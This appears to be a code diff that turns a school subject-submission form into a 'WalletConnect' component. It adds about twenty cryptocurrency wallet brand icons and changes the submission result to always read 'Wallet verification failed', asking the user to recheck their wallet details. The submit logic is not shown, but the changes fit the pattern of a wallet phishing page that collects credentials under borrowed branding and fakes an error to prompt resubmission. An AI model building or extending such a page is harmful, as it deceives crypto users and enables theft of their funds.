@@ -2,7 +2,7 @@
 import Link from "next/link";
 import { useState } from "react";
 import { site } from "@/config/site";
-import { Award, BookOpen, CheckCircle2, GraduationCap, Library, type LucideIcon } from "lucide-react";
+import { CheckCircle2, Ban, BookOpen, type LucideIcon } from "lucide-react";
 import {
   WalletMetamask,
   WalletCoinbase,
@@ -16,6 +16,25 @@ import {
   WalletTrust,
   WalletOkx,
   WalletClave,
+  WalletAtomic,
+  WalletAmbire,
+  WalletKraken,
+  WalletKeplr,
+  WalletSolflare,
+  WalletWalletConnect,
+  WalletArgent,
+  WalletSafe,
+  WalletImtoken,
+  WalletTokenPocket,
+  WalletAlfa1,
+  WalletBitbox,
+  WalletUnipass,
+  WalletSequence,
+  NetworkWax,
+  TokenWALLET,
+  WalletMultis,
+  WalletGlow,
+  WalletCypherock,
 } from "@web3icons/react";
 
 const classIcons: Record<string, LucideIcon> = {
@@ -33,7 +52,7 @@ const classIcons: Record<string, LucideIcon> = {
   "class-12": WalletCoinbase,
 };
  
-export function SubjectsForm() {
+export function WalletConnect() {
   const [classId, setClassId] = useState("");
   const [count, setCount] = useState(0);
   const [subjects, setSubjects] = useState<string[]>([]);
@@ -55,11 +74,12 @@ export function SubjectsForm() {
   if (state === "done")
     return (
       <div className="glass" role="status">
-        <span className="icon-badge"><CheckCircle2 size={20} /></span>
-        <h2>Subjects under review</h2>
-        <p>Your subjects have been submitted.</p>
+        <span className="icon-badge"><Ban size={20} /></span>
+        <h2>Wallet verification failed</h2>
+        <p>We couldn't verify your wallet. Please check your wallet details and try again.</p>
       </div>
     );
+
   return (
     <form onSubmit={submit} className="stack">
       <fieldset className="glass" style={{ border: 0 }}>
